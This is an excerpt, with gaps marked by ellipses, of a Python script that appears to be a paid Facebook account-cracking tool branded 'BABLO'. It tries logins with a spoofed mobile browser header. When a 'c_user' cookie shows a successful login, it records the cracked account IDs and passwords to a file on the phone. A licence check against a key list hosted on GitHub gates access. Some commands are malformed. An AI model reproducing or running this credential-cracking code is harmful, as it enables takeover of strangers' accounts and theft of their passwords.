         ...
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [BABLO-OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/BABLO-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Masud-KG BABLO/PAID-TEST/blob/main/CONTROL.tex").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-openhttps://www.facebook.com/profile.php?id=100095282897095")
        time.sleep(3.0)
        ...
        print("               Copy And Not Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am MD BABLO er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Not Key")
        os.system("xdg-openhttps://www.facebook.com/profile.php?id=100095282897095")
        superuser()        
superuser()
